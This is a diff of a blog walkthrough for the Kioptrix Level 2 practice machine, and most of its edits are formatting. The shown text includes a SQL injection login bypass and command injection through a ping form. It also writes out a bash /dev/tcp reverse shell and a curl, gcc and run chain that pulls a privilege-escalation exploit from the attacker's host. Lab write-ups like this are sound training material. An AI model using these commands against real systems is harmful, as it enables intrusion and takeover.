@@ -14,7 +14,6 @@ Hey guys, in this post I'll try and show you how to solve Level 2 Kioptrix machi
 Without further a do, let's start. 
 
 # Scanning, enumeration and exploitation
- 
 Run netdiscover to find the IP of our needed machine:
 
 ```console
@@ -100,19 +99,20 @@ Nmap done: 1 IP address (1 host up) scanned in 121.00 seconds
 
 We get hits on different ports such as 22 [SSH], 80 [HTTP], 111 [RPC bind], 3306 [MYSQL] and more.  Because our target is running an HTTP web server we put the IP in a browser which results in this page:
 
-			![Codes](/img/blog/IMG_1797.jpg)
+			![img](/img/blog/IMG_1797.jpg)
 
 This seems like a custom, lazy-made login function. Normally I wouldn't try and break login pages & their authentication in the first stage of enumeration, but because of the cheap look, an attempt for [SQL injection](https://www.w3schools.com/sql/sql_injection.asp) won't hurt. And indeed, a simple `**' or 1=1#**` did the trick!  Login has been successfully bypassed and we are presented with yet another challenge!  
 
-			![Codes](/img/blog/IMG_1798.JPG)  
+			![img](/img/blog/IMG_1798.JPG)  
 
-From enough completed challenges and CTFs I immediately recognized a possible code injection vulnerability. Let me explain. Our current webapp prompts us to enter a machine to ping. If you think about what's happening inside our target, a command like this is parsed: `ping Entered_IP`. Seems harmless, right? Well, no it is not! A character like "semicolon" (;) or "OR" (||) can be used to append a terminator to the preset ping command which changes a query from `ping ENTERED_IP` to  `ping ENTERED_IP; malicious input`. This effectively allows for code execution which makes us able to enter any command we like into our designated machine. 
+From enough completed challenges and CTFs I immediately recognized a possible code injection vulnerability. Let me explain. Our current webapp prompts us to enter a machine to ping. If you think about what's happening inside our target, a command like this is parsed: `ping Entered_IP`. Seems harmless, right? Well, no it is not! A character like "semicolon" (;) or "OR (||) can be used to append a terminator to the preset ping command which changes a query from `ping ENTERED_IP` to  `ping ENTERED_IP; malicious input`. This effectively allows for code execution which makes us able to enter any command we like into our designated machine. 
 
-	              ![Codes](img/blog/IMG_1799.JPG)
+	              ![img](img/blog/IMG_1799.JPG)
 
 An attempt to estabilish a reverse shell with netcat was made, but as it appears, our target doesn't  have it. Luckily, there was another trick up my sleeve - `; bash -i >& /dev/tcp/192.168.0.213/4444 0>&1`. This is just another way of telling a computer to connect back to you. Of course before doing this we need to ready our netcat listener. `nc -lvp 4444`
 
-			 ![Codes](img/blog/IMG_1800.JPG)			
+			 ![img](img/blog/IMG_1800.JPG)		
+			 
 > lvp - listen, verbose, port
 
 BOOM! 
@@ -135,9 +135,11 @@ I decided to download the code onto my machine, host it on apache 2 webserver an
 root@EdgeOfNight:~# mv /root/Downloads/privesc.c /var/www/html/ && /etc/init.d/apache2 start
 [ ok ] Starting apache2 (via systemctl): apache2.service.
 ```
-> mv 						  - moves privesc.c file from Downloads to /var/www/html 
-> /etc/init.d/apache2 start    - starts apache web server on our machine which makes privesc.c file downloadable by accessing our IP address   
-> && 						   - just executes the 2 commands after each other
+> mv - moves privesc.c file from Downloads to /var/www/html 
+-
+> /etc/init.d/apache2 start - starts apache web server on our machine which makes privesc.c file downloadable by accessing our IP address
+-
+> && - just executes the 2 commands after each other
 
 
 ##### Kioptrix machine:
@@ -145,15 +147,19 @@ cd /tmp && id && curl 192.168.0.213/exploit.c -o exploit.c 2> /dev/null && gcc e
 
 			![Codes](/img/blog/IMG_1801.JPG)
 
-> cd /tmp 		       - changes directory into tmp
-> id 	       	       - prints user information before privilege escalation
-> curl IP/exploit.c    - makes an HTTP request to our machine where /exploit.c is path to corresponding exploit, -o saves the output of the request, 2> is not needed - pipes the curl 					   commands errors into "void" 
-> gcc exploit.c         - compiles our C code using GCC
-> ./a.out			 - runs the compiled binary from GCC (every compiled file by this compiler has default output name of a.out)
+> cd /tmp - changes directory into tmp
+-
+> id - prints user information before privilege escalation
+-
+> curl IP/exploit.c - makes an HTTP request to our machine where /exploit.c is path to corresponding exploit, -o saves the output of the request, 2> is not needed - pipes the curl commands errors into "void" 
+-
+> gcc exploit.c - compiles our C code using GCC
+-
+> ./a.out - runs the compiled binary from GCC (every compiled file by this compiler has default output name of a.out)
 
 # Congratulations! The box has been rooted!
 
-#Conclusion
+## Conclusion
 A solid box with a lot of hidden knowledge for new people entering infosec community. There are always things to learn no matter how you many times you do them - same with this box. Personally I found this challenge quite easy, but enjoyed it non the less. My thanks goes to the creator for making such an awesome box.
 -
 Have any suggestions or feedback? Write it down below in the comments or send me a message on twitter!
